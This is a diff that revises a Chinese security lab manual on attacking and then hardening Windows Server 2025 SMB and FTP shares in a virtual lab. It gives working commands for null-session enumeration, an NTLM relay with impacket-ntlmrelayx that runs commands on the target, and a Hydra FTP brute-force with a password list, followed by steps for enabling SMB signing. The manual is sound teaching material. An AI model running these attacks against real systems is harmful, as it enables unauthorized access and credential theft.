@@ -3,11 +3,18 @@ color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
 ---
 # 实验三：SMB与FTP共享服务渗透
 
-> 对应章节：项目三 Windows服务器共享管理
-实验目标：掌握 SMB 匿名枚举、SMB Signing 与 NTLM Relay 风险、FTP 明文嗅探风险、共享权限边界验证与加固方法
-预计用时：120分钟
-难度等级：⭐⭐⭐（中级）
-> 
+<aside>
+🧪
+
+**对应章节**：项目三 Windows服务器共享管理
+
+**实验目标**：掌握 SMB 匿名枚举、SMB Signing 与 NTLM Relay 风险、FTP 明文嗅探风险、共享权限边界验证与加固方法
+
+**预计用时**：120 分钟 · **难度等级**：⭐⭐⭐（中级）
+
+**前置知识**：实验二中的 NTLM 认证流程（挑战/响应机制）是理解本实验 SMB 中继攻击的基础
+
+</aside>
 
 ---
 
@@ -178,7 +185,6 @@ Windows XP/2003         Windows 7/2008R2       Windows 10/2016+
 ```
 
 > **实验关键提示**：本实验覆盖 SMB 和 FTP 两个攻击面。SMB 部分的核心是理解空会话枚举和 SMB 中继攻击（NTLM Relay）的危害；FTP 部分的核心是理解明文传输的安全风险。实验完成后需通过启用 SMB 签名、禁用 SMBv1、关闭匿名枚举等措施进行加固验证。
-> 
 
 ---
 
@@ -196,37 +202,95 @@ Windows XP/2003         Windows 7/2008R2       Windows 10/2016+
 └─────────────────────┘                                      └─────────────────────┘
 ```
 
-> **注意**：本实验中SMB中继攻击需要目标服务器未启用SMB签名（Windows Server 2025工作组模式默认不启用）。所有实验步骤均可在Windows Server 2025上完成。
-> 
+> **注意**：Windows Server 2025 的 SMB 签名默认行为与旧版本不同——服务端签名默认不要求，但**客户端签名默认要求**。靶机初始化脚本已关闭客户端签名以满足中继攻击演示需求。所有实验步骤均可在 Windows Server 2025 上完成。
 
 ### 1.2 靶机环境详细配置
 
 **虚拟机设置**：
 
-| 项目 | 配置 | 操作系统 | Windows Server 2025 Standard（桌面体验版） |
-| --- | --- | --- | --- |
-| 内存 | 4 GB | 硬盘 | 60 GB |
-| 网络适配器 | NAT模式 | 快照 | 实验前创建快照（命名：实验三-初始状态） |
+| 项目 | 配置 |
+| --- | --- |
+| 操作系统 | Windows Server 2025 Standard（桌面体验版） |
+| 内存 | 4 GB |
+| 硬盘 | 60 GB |
+| 网络适配器 | NAT模式 |
+| 快照 | 实验前创建快照（命名：实验三-初始状态） |
 
-**靶机初始化脚本**（管理员CMD执行）：
-
-```
-REM ============================================
-REM 靶机环境初始化脚本 - 实验三
-REM ============================================
-```
-
-**安装IIS FTP服务**：
+**靶机初始化脚本**（管理员PowerShell执行）：
 
 ```powershell
-# 通过服务器管理器安装IIS和FTP
-Install-WindowsFeature Web-Server, Web-FTP-Server, Web-FTP-Service, Web-FTP-Extensibility -IncludeManagementTools
+# ============================================
+# 靶机环境初始化脚本 - 实验三
+# ============================================
 
-# 配置FTP站点（也可通过IIS管理器图形界面配置）
-# 1. 创建FTP站点 CompanyFTP，绑定21端口
-# 2. 身份验证：启用"基本"身份验证，禁用匿名
-# 3. 允许访问：指定用户 Jerry, Tom
-# 4. 权限：读取和写入
+# --- 1. 创建测试用户和组 ---
+net user Jerry P@ssw0rd123 /add /comment:"Sales Department"
+net user Tom P@ssw0rd123 /add /comment:"Finance Department"
+net localgroup 部门A /add
+net localgroup 部门B /add
+net localgroup 部门A Jerry /add
+net localgroup 部门B Tom /add
+
+# --- 2. 创建共享文件夹结构 ---
+mkdir C:\SharedFolder\Sales
+mkdir C:\SharedFolder\Finance
+echo "Sales Q1 Report - Confidential" > C:\SharedFolder\Sales\secret_sales.txt
+echo "Finance Annual Report" > C:\SharedFolder\Finance\report.xlsx
+
+# --- 3. 配置共享和权限 ---
+# 创建共享（Everyone完全控制，依赖NTFS权限做细粒度控制）
+New-SmbShare -Name "CompanyShare" -Path "C:\SharedFolder" `
+  -FullAccess "Everyone" -Description "Company Shared Files"
+
+# 配置NTFS权限（Jerry只读Sales，Tom可改Finance）
+icacls C:\SharedFolder\Sales /grant "Jerry:(OI)(CI)R"
+icacls C:\SharedFolder\Finance /grant "Tom:(OI)(CI)M"
+```
+
+```powershell
+# --- 4. 安装IIS FTP服务 ---
+Install-WindowsFeature Web-Server, Web-FTP-Server, `
+  Web-FTP-Service -IncludeManagementTools
+
+# 创建FTP根目录
+mkdir C:\FTPRoot
+echo "FTP Test File" > C:\FTPRoot\readme.txt
+
+# 创建FTP站点
+Import-Module WebAdministration
+New-WebFtpSite -Name "CompanyFTP" -Port 21 `
+  -PhysicalPath "C:\FTPRoot"
+
+# 配置FTP身份验证：启用基本认证，禁用匿名
+Set-ItemProperty "IIS:\Sites\CompanyFTP" `
+  -Name ftpServer.security.authentication.basicAuthentication.enabled `
+  -Value $true
+Set-ItemProperty "IIS:\Sites\CompanyFTP" `
+  -Name ftpServer.security.authentication.anonymousAuthentication.enabled `
+  -Value $false
+
+# 授权Jerry和Tom访问FTP
+Add-WebConfiguration "/system.ftpServer/security/authorization" `
+  -Value @{accessType="Allow";users="Jerry,Tom";permissions="Read,Write"} `
+  -PSPath IIS:\ -Location "CompanyFTP"
+```
+
+```powershell
+# --- 5. 确保SMB签名未启用（实验需要） ---
+# Windows Server 2025 默认：服务端签名不要求，但客户端签名要求
+# 实验中继攻击需要同时关闭服务端和客户端签名
+Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $false -Force
+
+# --- 6. 开放防火墙端口 ---
+New-NetFirewallRule -DisplayName "SMB-In" -Direction Inbound `
+  -Protocol TCP -LocalPort 445 -Action Allow
+New-NetFirewallRule -DisplayName "FTP-In" -Direction Inbound `
+  -Protocol TCP -LocalPort 21 -Action Allow
+New-NetFirewallRule -DisplayName "FTP-Data" -Direction Inbound `
+  -Protocol TCP -LocalPort 1024-65535 -Action Allow
+
+Write-Host "环境初始化完成！" -ForegroundColor Green
 ```
 
 ---
@@ -237,8 +301,8 @@ Install-WindowsFeature Web-Server, Web-FTP-Server, Web-FTP-Service, Web-FTP-Exte
 
 **步骤1：检查SMB共享是否允许匿名访问**
 
-```
-使用smbclient尝试匿名访问
+```bash
+# 使用smbclient尝试匿名访问
 smbclient -L //192.168.1.20 -N
 
 # 预期输出（如允许匿名）：
@@ -249,26 +313,25 @@ smbclient -L //192.168.1.20 -N
 # CompanyShare    Disk
 # IPC$            IPC       Remote IPC
 
-# 使用enum4linux全面枚举
-enum4linux -a 192.168.1.20
+# 使用enum4linux-ng全面枚举（Kali 2025 推荐替代 enum4linux）
+enum4linux-ng -A 192.168.1.20
 
 # 检查是否可以通过空会话枚举用户
-rpcclient -U "" 192.168.1.20 -c "enumdomusers"
-rpcclient -U "" 192.168.1.20 -c "enumdomgroups"
+rpcclient -U "" 192.168.1.20 -N -c "enumdomusers"
+rpcclient -U "" 192.168.1.20 -N -c "enumdomgroups"
 ```
 
 > **知识关联**：对应讲义中”匿名访问控制与枚举防护”——Windows默认允许空会话连接IPC$，可枚举用户和共享。
-> 
 
 **步骤2：枚举共享权限和ACL**
 
-```
-使用smbcacls查看共享权限
+```bash
+# 使用smbcacls查看共享权限
 smbcacls //192.168.1.20/CompanyShare -N
 
-# 使用CrackMapExec枚举
-crackmapexec smb 192.168.1.20 --shares
-crackmapexec smb 192.168.1.20 --users
+# 使用NetExec枚举（Kali 2025 中 crackmapexec 已被 netexec/nxc 替代）
+nxc smb 192.168.1.20 --shares
+nxc smb 192.168.1.20 --users
 
 # 尝试访问各个共享
 smbclient //192.168.1.20/CompanyShare -N -c "ls"
@@ -282,7 +345,7 @@ smbclient //192.168.1.20/ADMIN$ -N -c "ls"
 
 **步骤3：识别SMB协议版本**
 
-```
+```bash
 # 使用Nmap识别SMB版本
 nmap -p 445 --script smb-protocols 192.168.1.20
 # 预期输出：
@@ -295,164 +358,152 @@ nmap -p 445 --script smb-protocols 192.168.1.20
 # |     3.0
 # |     3.0.2
 # |     3.1.1
+# 注意：Windows Server 2025 默认不安装 SMBv1，列表中不会出现 NT LM 0.12
 
-# 使用CrackMapExec识别版本
-crackmapexec smb 192.168.1.20
+# 使用NetExec识别版本
+nxc smb 192.168.1.20
 
 # 使用smbclient指定协议版本连接
 smbclient -L //192.168.1.20 -N -m NT1
-# 注意：Kali 2025.4 中 -m NT1 替代已废弃的 -m SMB1
+# 注意：NT1是SMBv1的方言名称，Windows Server 2025 默认未安装 SMBv1，连接会被拒绝
 ```
 
 > **知识关联**：对应讲义中”SMB版本演进”——SMBv1已被废弃但旧系统仍默认启用，存在MS17-010等严重漏洞。
-> 
 
 **步骤4：检测SMB签名状态**
 
-```
+```bash
 # SMB签名是防止NTLM中继攻击的关键防御措施
 # 当SMB签名未启用时，攻击者可以将截获的NTLM认证中继到其他服务器
 
-# 使用CrackMapExec检测SMB签名状态
-crackmapexec smb 192.168.1.20
-# 输出中的 Signatures 字段：
-# SMB signing: NOT required  ← 表示签名未强制启用（存在中继风险）
+# 使用NetExec检测SMB签名状态
+nxc smb 192.168.1.20
+# 输出中的 signing 字段：
+# SMB  192.168.1.20  445  TARGET  [*] ... (signing:False)
+# signing:False ← 表示签名未强制启用（存在中继风险）
 
 # 使用Nmap脚本检测SMB安全模式
 nmap -p 445 --script smb-security-mode 192.168.1.20
-# 预期输出：
-# PORT     STATE SERVICE
-# 445/tcp open  microsoft-ds
-# | smb-security-mode:
-# |   account_used: guest
-# |   authentication_level: 1  ← 0=Anonymous, 1=User
-# |   challenge_response: supported
-# |   message_signing: disabled (dangerous, but default)
-# |   message_signing: REQUIRED (not dangerous)
 
-# 使用CrackMapExec生成可中继目标列表
-crackmapexec smb 192.168.1.20 --gen-relay-list
-# 输出SMB签名未启用且允许匿名访问的目标
+# 使用NetExec生成可中继目标列表（扫描网段中签名未启用的主机）
+nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+# 输出SMB签名未启用的主机IP到relay_targets.txt
 
 # 知识要点：
 # - SMB签名=对每个SMB消息添加数字签名，防止中间人篡改
 # - 签名未启用时，NTLM认证可被透明转发到其他服务器（中继攻击）
-# - Windows默认：域控要求签名，工作组服务器不要求
+# - Windows Server 2025 默认：服务端签名不要求（工作组），客户端签名要求
+#   （靶机初始化脚本已关闭客户端签名以满足实验需求）
 # - 防御措施：RequireSecuritySignature = $true
 ```
 
 > **知识关联**：对应讲义中”SMB安全”——SMB签名（SMB Signing）通过对消息进行数字签名来防止中间人篡改和NTLM中继攻击。
-> 
 
 ### 阶段三：SMB中继攻击（NTLM Relay）
 
 **步骤5：SMB中继攻击演示**
 
 ```
-# SMB中继攻击原理：
-# 攻击者截获受害者的NTLM认证请求，将其转发（中继）到目标服务器
-# 目标服务器因为SMB签名未启用，无法验证请求来源，直接接受认证
-# 攻击者无需知道密码，即可获得目标服务器的访问权限
+# ═══════════════════════════════════════════════════════════════
+# SMB中继攻击原理（回顾实验二的NTLM认证流程）：
+# ═══════════════════════════════════════════════════════════════
+# 实验二中我们学过NTLM挑战/响应认证：
+#   客户端 → 服务器：我是Jerry
+#   服务器 → 客户端：Challenge（随机数）
+#   客户端 → 服务器：Response = HMAC(Challenge, NTLM_Hash)
+#
+# 中继攻击的关键洞察：
+#   攻击者站在中间，把服务器发来的Challenge转发给受害者，
+#   再把受害者算出的Response转发给服务器。
+#   如果目标服务器未启用SMB签名，无法验证消息来源，直接接受认证！
+#
+# 攻击者无需知道密码，即可"借用"受害者的身份访问目标服务器。
+# ═══════════════════════════════════════════════════════════════
 
 # 终端1：在Kali上启动ntlmrelayx中继工具
-# 准备中继目标列表
+# 前置步骤：关闭Kali本机的SMB服务，释放445端口
+sudo systemctl stop smbd nmbd 2>/dev/null
+sudo killall smbd nmbd 2>/dev/null
+
+# 准备中继目标列表（目标是靶机）
 echo "192.168.1.20" > /tmp/targets.txt
 
-# 启动SMB中继监听（替换Kali的SMB服务）
-# -smb2support：支持SMBv2协议
-# -exec-method smbexec：中继成功后通过SMB执行命令
-sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
-  -tf /tmp/targets.txt -smb2support -exec-method smbexec
+# 启动SMB中继监听
+# -tf：目标文件  -smb2support：支持SMBv2  -c：中继成功后执行的命令
+sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"
 
 # 预期输出（等待连接）：
 # [*] Protocol Client SMB loaded..
-# [*] Protocol Client LDAP loaded..
-# [*] Running in relay mode
+# [*] Running in relay mode to hosts in /tmp/targets.txt
 # [*] SMB server started on 0.0.0.0:445
 
-# 终端2：模拟受害者连接到攻击者的SMB服务
-# 实际攻击中，受害者可能通过以下方式被诱导：
-# - 打开恶意文档中的UNC路径（\\attacker\share）
-# - 访问攻击者控制的Web页面触发NTLM认证
-# - 邮件中的网络驱动器映射
-
-# 使用已获取的凭据连接Kali（模拟NTLM认证触发）
-smbclient //192.168.1.10/tmp -U weakadmin%admin123
+# 终端2：模拟受害者被诱导连接攻击者的SMB服务
+# 在靶机（Windows Server）上以Jerry身份执行：
+# （模拟场景：Jerry打开了钓鱼邮件中的UNC链接）
+net use \\192.168.1.10\share /user:Jerry P@ssw0rd123
 
 # 回到终端1，观察ntlmrelayx输出：
-# [*] SMBD-3: Received connection from 192.168.1.10
-# [*] SMBD-3: Connection from 192.168.1.10 controlled
-# [*] Protocol Client SMB loaded..
-# [*] Protocol Client LDAP loaded..
-# [+] SMB session found for domain: WORKGROUP user: weakadmin
-# [+] SMB relay succeeded!
-# [*] SMBD-3: Connection from 192.168.1.10 controlled, attacking target 192.168.1.20
-# [+] SMB signing is NOT required! Relay attack may succeed
-
-# 中继成功后，ntlmrelayx自动获得目标SMB访问权限
-# 可以执行以下操作（通过--exec-method参数指定）：
-# -smbexec    通过SMB服务执行命令（创建服务）
-# -atexec     通过任务计划执行命令
-# -wmiexec    通过WMI远程执行命令
-
-# 通过中继会话执行命令示例：
-# 在ntlmrelayx运行时，连接成功后会自动进入交互式Shell
-# 或使用 -c 参数直接执行命令：
-sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
-  -tf /tmp/targets.txt -smb2support -c "whoami"
-# 预期输出：WORKGROUP\weakadmin
-
-sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
-  -tf /tmp/targets.txt -smb2support -c "ipconfig /all"
-# 预期输出：目标服务器的完整网络配置信息
+# [*] SMBD: Received connection from 192.168.1.20
+# [*] Authenticating against smb://192.168.1.20 as WORKGROUP/JERRY
+# [*] SMB signing is NOT required on 192.168.1.20
+# [+] Relay to 192.168.1.20 succeeded!
+# [+] Executed command: whoami
+# [+] Result: nt authority\system
+#
+# 关键观察：攻击者从未输入Jerry的密码，却获得了目标服务器的访问权限！
 ```
+
+> **知识关联**：对应实验二 §1.2 NTLM认证流程——中继攻击利用了NTLM协议"不验证消息来源"的设计缺陷。实验二中我们学到Response只需NTLM Hash即可计算，中继攻击更进一步：连Hash都不需要，直接转发整个认证过程。
 
 **步骤6：启用SMB签名防御中继攻击**
 
-```
+```powershell
 # 在靶机上启用SMB签名（需要管理员权限）
 # 启用SMB服务端签名（服务器发出的消息带签名）
 Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
-
-# 启用SMB客户端签名（客户端验证服务器签名）
-Set-SmbClientConfiguration -EnableSecuritySignature $true -Force
+# 启用SMB客户端签名（Windows Server 2025 默认已启用，此处显式确认）
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
 # 验证签名已启用
 Get-SmbServerConfiguration | Select RequireSecuritySignature
-# 预期：True
-
-Get-SmbClientConfiguration | Select EnableSecuritySignature
-# 预期：True
-
-# 从Kali重新检测SMB签名状态
-crackmapexec smb 192.168.1.20
-# 输出中的 Signatures 字段：
-# SMB signing: REQUIRED (not dangerous)  ← 签名已强制启用
-
-# 再次运行ntlmrelayx中继攻击
-sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
-  -tf /tmp/targets.txt -smb2support -c "whoami"
-# 触发NTLM认证：
-smbclient //192.168.1.10/tmp -U weakadmin%admin123
-
-# 预期：中继失败！
-# [-] SMB signing is REQUIRED! Relay attack will NOT succeed
-# [*] Relay attempt to 192.168.1.20:445 FAILED
-
-# 加固前后对比总结：
-# ┌─────────────────────────────────────────────────────────┐
-# │  状态              │  SMB签名    │  中继攻击结果        │
-# ├───────────────────┼──────────┼──────────────────────┤
-# │  加固前            │  未启用    │  ✅ 中继成功         │
-# │  加固后            │  已启用    │  ❌ 中继失败         │
-# └─────────────────────────────────────────────────────────┘
-
-# 补充加固：同时禁用SMBv1（已在步骤3中完成）
-# 组合防御 = 启用SMB签名 + 禁用SMBv1 + 关闭匿名枚举
+Get-SmbClientConfiguration | Select RequireSecuritySignature
+# 预期：均为 True
 ```
 
-> **知识关联**：对应讲义中”SMB安全”——NTLM中继攻击利用SMB签名未启用的弱点，将截获的认证请求转发到目标服务器。启用SMB签名是最有效的防御手段，微软推荐所有Windows服务器启用此功能。
-> 
+从 Kali 重新检测并验证中继攻击失败：
+
+```bash
+# 从Kali重新检测SMB签名状态
+nxc smb 192.168.1.20
+# 输出变化：
+# SMB  192.168.1.20  445  TARGET  [*] ... (signing:True)  ← 签名已强制启用
+
+# 再次运行中继攻击
+sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -c "whoami"
+
+# 在靶机上再次模拟受害者连接：
+net use \\192.168.1.10\share /user:Jerry P@ssw0rd123
+
+# 预期：中继失败！
+# [-] Signing is required on 192.168.1.20, skipping...
+# [*] No targets left to relay to, exiting.
+```
+
+```
+加固前后对比总结：
+┌──────────────────────────────────────────────────────┐
+│  状态       │  SMB签名    │  中继攻击结果            │
+├─────────────┼─────────────┼──────────────────────────┤
+│  加固前     │  未启用     │  中继成功，执行命令      │
+│  加固后     │  已启用     │  中继失败，目标被跳过    │
+└──────────────────────────────────────────────────────┘
+
+原理：启用签名后，每个SMB消息都附带基于会话密钥的数字签名。
+攻击者虽然能转发消息，但无法伪造签名（因为不知道会话密钥），
+目标服务器验签失败 → 拒绝连接。
+```
+
+> **知识关联**：对应讲义中”SMB安全”——NTLM中继攻击利用SMB签名未启用的弱点，将截获的认证请求转发到目标服务器。启用SMB签名是最有效的防御手段。
 
 ---
 
@@ -477,6 +528,18 @@ curl -v ftp://192.168.1.20/ --user anonymous:
 **步骤8：FTP弱口令暴力破解**
 
 ```
+# 首先在Kali上创建密码字典
+cat > /tmp/passwords.txt << 'EOF'
+123456
+password
+admin
+P@ssw0rd
+P@ssw0rd123
+letmein
+qwerty
+abc123
+EOF
+
 # 使用Hydra进行FTP爆破
 hydra -l Jerry -P /tmp/passwords.txt ftp://192.168.1.20
 hydra -l Tom -P /tmp/passwords.txt ftp://192.168.1.20
@@ -502,7 +565,6 @@ ftp 192.168.1.20
 ```
 
 > **知识关联**：对应讲义中”FTP工作原理”——FTP控制通道（21端口）的账号密码为明文传输，可被网络嗅探截获。
-> 
 
 **步骤10：文件上传与目录遍历测试**
 
@@ -512,20 +574,27 @@ ftp 192.168.1.20
 # 用户名：Jerry
 # 密码：P@ssw0rd123
 
-# 测试目录遍历
-cd ../../
-cd ../../../
-cd ../../Windows/System32/
-
-# 测试文件上传
-put /tmp/test.txt
-
-# 测试上传WebShell（如果FTP目录与Web目录重合）
-put /tmp/shell.php
-
-# 查看当前目录
+# 查看当前目录（确认FTP根目录）
 pwd
-ls -la
+ls
+
+# 测试目录遍历（尝试跳出FTP根目录）
+cd ../../
+pwd
+# 如果能跳出FTP根目录 → FTP用户隔离未配置（严重风险）
+
+cd ../../../Windows/System32/
+# 如果成功 → 攻击者可读取系统文件
+
+# 测试文件上传权限
+echo "test upload" > /tmp/test_upload.txt
+put /tmp/test_upload.txt
+# 如果成功 → 写入权限过宽，攻击者可上传恶意文件
+
+# 安全风险总结：
+# 1. 目录遍历成功 → 可访问整个文件系统
+# 2. 写入权限过宽 → 可上传恶意文件到Web目录（若FTP与IIS共用目录）
+# 3. 结合实验四（IIS）：若FTP目录与Web根目录重合，上传的文件可被HTTP访问执行
 ```
 
 ---
@@ -557,7 +626,6 @@ smb: \Finance\> put /tmp/test.txt
 ```
 
 > **知识关联**：对应讲义中”共享权限与NTFS权限”——最终有效权限=min(共享权限, NTFS权限)，需验证两者是否正确配置。
-> 
 
 ---
 
@@ -566,9 +634,17 @@ smb: \Finance\> put /tmp/test.txt
 **步骤12：禁用SMBv1并关闭匿名枚举**
 
 ```powershell
-# 禁用SMBv1
+# 禁用SMBv1（服务端）
 Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
-Set-SmbClientConfiguration -EnableSMB1Protocol $false -Force
+
+# 确认 SMBv1 功能未安装（Windows Server 2025 默认不安装 SMBv1）
+Get-WindowsFeature FS-SMB1
+# 如果 Install State 显示 Installed，则执行移除：
+# Remove-WindowsFeature FS-SMB1
+
+# 启用SMB服务端和客户端签名（加固核心）
+Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
 # 关闭匿名枚举
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
@@ -588,7 +664,7 @@ Get-SmbServerConfiguration | Select EnableSMB1Protocol
 **步骤13：验证加固效果**
 
 ```
-# SMBv1连接应失败（Kali 2025.4 中使用 -m NT1 替代已废弃的 -m SMB1）
+# SMBv1连接应失败（NT1是SMBv1的方言名称）
 smbclient -L //192.168.1.20 -N -m NT1
 # 预期：连接失败，提示协议被拒绝
 
@@ -596,11 +672,11 @@ smbclient -L //192.168.1.20 -N -m NT1
 smbclient -L //192.168.1.20 -N
 # 预期：NT_STATUS_ACCESS_DENIED
 
-enum4linux -a 192.168.1.20
+enum4linux-ng -A 192.168.1.20
 # 预期：大量枚举结果返回空或被拒绝
 
-# CrackMapExec验证
-crackmapexec smb 192.168.1.20 --shares
+# NetExec验证
+nxc smb 192.168.1.20 --shares
 # 预期：无法获取共享列表
 ```
 
@@ -628,26 +704,51 @@ crackmapexec smb 192.168.1.20 --shares
 
 ## 四、实验清理
 
-```bash
-REM 1. 删除测试用户
+```powershell
+# 1. 删除测试用户和组
 net user Jerry /delete
 net user Tom /delete
 net localgroup 部门A /delete
 net localgroup 部门B /delete
 
-REM 2. 删除共享
+# 2. 删除共享和FTP站点
 net share CompanyShare /delete
+Import-Module WebAdministration
+Remove-WebSite -Name "CompanyFTP"
 
-REM 3. 删除测试目录
-rmdir /s /q C:\SharedFolder
-rmdir /s /q C:\FTPRoot
+# 3. 删除测试目录
+Remove-Item -Recurse -Force C:\SharedFolder
+Remove-Item -Recurse -Force C:\FTPRoot
 
-REM 4. 启用防火墙
-netsh advfirewall set allprofiles state on
+# 4. 恢复SMB签名为默认值（Windows Server 2025 默认：服务端不要求，客户端要求）
+Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
 
-REM 5. 卸载IIS（可选）
-REM servermanagercmd -remove Web-Server
+# 5. 删除防火墙规则
+Remove-NetFirewallRule -DisplayName "SMB-In"
+Remove-NetFirewallRule -DisplayName "FTP-In"
+Remove-NetFirewallRule -DisplayName "FTP-Data"
+
+# 6. 卸载IIS（可选）
+# Remove-WindowsFeature Web-Server, Web-FTP-Server
 ```
 
-> **免责声明**：本实验仅用于授权的安全教学环境。SMB中继攻击涉及网络协议层面的安全测试，请确保在虚拟机环境中操作。
->
+> **免责声明**：本实验仅用于授权的安全教学环境。SMB中继攻击涉及网络协议层面的安全测试，请确保在隔离的虚拟机环境中操作，切勿在生产网络中执行。
+
+---
+
+## 五、知识链衔接
+
+```
+实验二（本地认证攻击）          实验三（网络服务攻击）          实验四（Web服务攻击）
+─────────────────────         ─────────────────────         ─────────────────────
+NTLM认证流程                   SMB中继（NTLM Relay）          IIS请求管道
+Pass-the-Hash                  SMB匿名枚举                    HTTP方法探测
+SAM/LSASS凭据提取              FTP明文嗅探                    目录遍历/WebShell
+                               共享权限越权                    安全响应头
+
+衔接关系：
+• 实验二的NTLM认证知识 → 实验三SMB中继攻击的理论基础
+• 实验三的FTP服务（IIS组件） → 实验四IIS Web安全审计的前置铺垫
+• 实验三的共享权限模型 → 实验四的NTFS权限与IIS虚拟目录权限对照
+```
